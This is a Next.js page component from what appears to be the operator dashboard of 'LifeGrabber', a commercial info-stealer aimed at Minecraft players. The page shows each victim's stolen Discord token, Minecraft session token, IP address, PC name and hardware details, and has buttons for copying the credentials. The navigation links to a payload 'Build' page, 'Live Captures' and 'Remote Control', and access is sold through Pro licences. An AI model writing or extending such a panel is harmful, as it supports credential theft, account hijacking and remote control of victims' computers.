'use client';

import { useEffect, useState } from 'react';
import { useRouter, useParams } from 'next/navigation';

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  border: 'rgba(255,255,255,0.06)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} className="btn-smooth" style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function GrabSection({ title, icon, children }) {
  return (
    <div className="glass-card" style={{ borderRadius: 12, padding: 20 }}>
      <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 14, display: 'flex', alignItems: 'center', gap: 6 }}>
        <span>{icon}</span> {title}
      </div>
      {children}
    </div>
  );
}

function InfoRow({ label, value, full }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: 13 }}>
      <span style={{ color: colors.textDim, flexShrink: 0 }}>{label}</span>
      <span style={{ color: colors.text, textAlign: 'right', maxWidth: full ? '65%' : '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginLeft: 12 }}>{value || '—'}</span>
    </div>
  );
}

export default function GrabDetailPage() {
  const router = useRouter();
  const params = useParams();
  const [grab, setGrab] = useState(null);
  const [loading, setLoading] = useState(true);
  const [deleting, setDeleting] = useState(false);
  const [copied, setCopied] = useState(false);
  const [copiedSession, setCopiedSession] = useState(false);
  const [copiedDiscord, setCopiedDiscord] = useState(false);
  const [copiedToken, setCopiedToken] = useState(false);
  const [isPro, setIsPro] = useState(false);
  const [proChecked, setProChecked] = useState(false);
  const [userEmail, setUserEmail] = useState('');

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          setUserEmail(d.user.email);
          if (d.user.email === 'lifegrading@gmail.com') {
            setIsPro(true);
            setProChecked(true);
          } else {
            fetch('/api/user/pro')
              .then(r => r.json())
              .then(p => { setIsPro(p.is_pro); setProChecked(true); })
              .catch(() => { setIsPro(false); setProChecked(true); });
          }
        } else {
          setProChecked(true);
        }
      })
      .catch(() => setProChecked(true));

    fetch(`/api/grabs/${params.id}`)
      .then(r => r.json())
      .then(d => { setGrab(d.grab || d); setLoading(false); })
      .catch(() => setLoading(false));
  }, [params.id]);

  const handleDelete = async () => {
    setDeleting(true);
    await fetch(`/api/grabs/${params.id}`, { method: 'DELETE' });
    router.push('/dashboard/grabs');
  };

  const handleCopyAll = () => {
    const lines = [
      `Minecraft Username: ${grab.minecraft_username}`,
      `Discord Username: ${grab.discord_username}`,
      `IP Address: ${grab.ip_address}`,
      `Country: ${grab.country}`,
      `Timezone: ${grab.timezone}`,
      `OS: ${grab.os}`,
      `OS Version: ${grab.os_version}`,
      `PC Name: ${grab.pc_name}`,
      `CPU: ${grab.cpu}`,
      `RAM: ${grab.ram}`,
      `GPU: ${grab.gpu}`,
      `Screen: ${grab.screen_resolution}`,
      `Disk: ${grab.disk_space}`,
      `Java Version: ${grab.java_version}`,
      `Language: ${grab.language}`,
      `Desktop: ${grab.desktop_env}`,
      `Client Version: ${grab.client_version}`,
      `Session ID: ${grab.session_id}`,
      `Session Start: ${grab.session_start}`,
      `Discord Token: ${grab.discord_token}`,
      `Servers: ${grab.servers}`,
    ].filter(l => !l.endsWith(': ') && !l.endsWith(': null')).join('\n');
    navigator.clipboard.writeText(lines);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleCopySession = () => {
    const lines = [
      `Session Token: ${grab.session_id || '—'}`,
      `Session Start: ${grab.session_start || '—'}`,
      `Client Version: ${grab.client_version || '—'}`,
      `Java Version: ${grab.java_version || '—'}`,
    ].join('\n');
    navigator.clipboard.writeText(lines);
    setCopiedSession(true);
    setTimeout(() => setCopiedSession(false), 2000);
  };

  const handleCopyDiscord = () => {
    navigator.clipboard.writeText(grab.discord_username || '');
    setCopiedDiscord(true);
    setTimeout(() => setCopiedDiscord(false), 2000);
  };

  const handleCopyToken = () => {
    navigator.clipboard.writeText(grab.discord_token || '');
    setCopiedToken(true);
    setTimeout(() => setCopiedToken(false), 2000);
  };

  const mask = (val) => {
    if (!val || val === 'Unknown' || val === 'N/A' || val === '') return '—';
    if (val.length > 16) return val.substring(0, 8) + '••••' + val.substring(val.length - 4);
    return val;
  };

  const formatDate = (t) => {
    if (!t) return '—';
    return new Date(t).toLocaleString();
  };

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!isPro && userEmail !== 'lifegrading@gmail.com') {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
          <div style={{ fontSize: 48 }}>🔒</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
          <div style={{ fontSize: 14, color: colors.textDim }}>You need a Pro license to view grab details.</div>
          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: '#3b82f6', fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
            <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
            <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
          </div>
          <div style={{ flex: 1 }}>
            <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
            <NavItem icon="⚡" label="Grabs" active onClick={() => router.push('/dashboard/grabs')} />
          </div>
        </aside>
        <div style={{ flex: 1, padding: '28px 36px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!grab) {
    return (
      <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
            <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
            <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
          </div>
          <div style={{ flex: 1 }}>
            <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
            <NavItem icon="⚡" label="Grabs" active onClick={() => router.push('/dashboard/grabs')} />
          </div>
        </aside>
        <div style={{ flex: 1, padding: '28px 36px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Grab not found.</div>
      </div>
    );
  }

  const servers = grab.servers ? grab.servers.split(',').filter(Boolean) : [];
  const osShort = grab.os?.includes('Windows') ? 'Windows' : grab.os?.includes('Mac') ? 'macOS' : grab.os?.includes('Linux') ? 'Linux' : grab.os || 'Unknown';

  return (
    <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" active onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="📋" label="Plans" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
          <div onClick={() => router.push('/dashboard/grabs')} className="btn-smooth" style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13, display: 'flex', alignItems: 'center', gap: 4 }}>← Back</div>
          <div style={{ display: 'flex', gap: 12 }}>
            <div onClick={handleCopySession} className="btn-smooth" style={{ cursor: 'pointer', color: copiedSession ? colors.green : colors.textDim, fontSize: 13 }}>
              {copiedSession ? '✓ Session Copied!' : '🎮 Copy Session'}
            </div>
            <div onClick={handleCopyAll} className="btn-smooth" style={{ cursor: 'pointer', color: copied ? colors.green : colors.textDim, fontSize: 13 }}>
              {copied ? '✓ Copied!' : '📋 Copy All Data'}
            </div>
            <div onClick={handleDelete} className="btn-smooth" style={{ cursor: 'pointer', color: '#ef4444', fontSize: 13, opacity: deleting ? 0.5 : 1 }}>🗑 Delete</div>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 28 }}>
          <div className="glass-card" style={{ width: 56, height: 56, borderRadius: 12, display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
            <img src={`https://mc-heads.net/avatar/${grab.minecraft_username}/56`} alt="" style={{ width: 56, height: 56 }} onError={e => { e.target.style.display = 'none'; }} />
          </div>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{ fontSize: 22, fontWeight: 700, color: colors.text }}>{grab.minecraft_username}</span>
              {grab.updated_at && grab.updated_at !== grab.created_at && (
                <span style={{ background: 'rgba(245, 158, 11, 0.15)', color: '#f59e0b', fontSize: 10, padding: '3px 8px', borderRadius: 5, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 0.5 }}>*Updated</span>
              )}
              <span style={{ background: 'rgba(94, 234, 212, 0.1)', color: '#5eead4', fontSize: 11, padding: '3px 10px', borderRadius: 5, fontWeight: 600 }}>🖥 {osShort}</span>
            </div>
            <div style={{ fontSize: 13, color: colors.textDim, marginTop: 3 }}>{formatDate(grab.updated_at || grab.created_at)}</div>
          </div>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
          <GrabSection title="Environment" icon="💻">
            <InfoRow label="IP Address" value={grab.ip_address} />
            <InfoRow label="PC Name" value={grab.pc_name} />
            <InfoRow label="Operating System" value={grab.os} />
            <InfoRow label="OS Version" value={grab.os_version} />
            <InfoRow label="Country" value={grab.country} />
            <InfoRow label="Timezone" value={grab.timezone} />
            <InfoRow label="Language" value={grab.language} />
          </GrabSection>
          <GrabSection title="Discord Info" icon="💬">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: 13 }}>
              <span style={{ color: colors.textDim }}>Discord Username</span>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ color: colors.text, textAlign: 'right', maxWidth: '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{grab.discord_username || '—'}</span>
                <div onClick={handleCopyDiscord} className="btn-smooth" style={{ cursor: 'pointer', color: copiedDiscord ? colors.green : colors.textDim, fontSize: 11, flexShrink: 0, padding: '2px 6px', borderRadius: 4, border: '1px solid rgba(255,255,255,0.06)' }}>
                  {copiedDiscord ? '✓' : '📋'}
                </div>
              </div>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: 13 }}>
              <span style={{ color: colors.textDim }}>Discord Token</span>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ color: colors.text, textAlign: 'right', maxWidth: '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginLeft: 12 }}>{mask(grab.discord_token)}</span>
                <div onClick={handleCopyToken} className="btn-smooth" style={{ cursor: 'pointer', color: copiedToken ? colors.green : colors.textDim, fontSize: 11, flexShrink: 0, padding: '2px 6px', borderRadius: 4, border: '1px solid rgba(255,255,255,0.06)' }}>
                  {copiedToken ? '✓' : '📋'}
                </div>
              </div>
            </div>
          </GrabSection>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
          <GrabSection title="Minecraft Session" icon="🎮">
            <InfoRow label="Session Token" value={mask(grab.session_id)} full />
            <InfoRow label="Session Start" value={grab.session_start ? formatDate(grab.session_start) : '—'} />
            <InfoRow label="Client Version" value={grab.client_version} />
            <InfoRow label="Java Version" value={grab.java_version} />
          </GrabSection>
          <GrabSection title="System Info" icon="⚙️">
            <InfoRow label="CPU" value={grab.cpu} />
            <InfoRow label="RAM" value={grab.ram} />
            <InfoRow label="GPU" value={grab.gpu} />
            <InfoRow label="Screen" value={grab.screen_resolution} />
            <InfoRow label="Disk" value={grab.disk_space} />
            <InfoRow label="Desktop" value={grab.desktop_env} />
          </GrabSection>
        </div>

        {servers.length > 0 && (
          <GrabSection title={`Servers (${servers.length})`} icon="🌐">
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, padding: '4px 0' }}>
              {servers.map((s, i) => (
                <div key={i} className="glass-card" style={{ borderRadius: 8, padding: '8px 14px', fontSize: 13, color: colors.text, display: 'flex', alignItems: 'center', gap: 6 }}>
                  🌐 {s.trim()}
                </div>
              ))}
            </div>
          </GrabSection>
        )}
      </div>
    </div>
  );
}
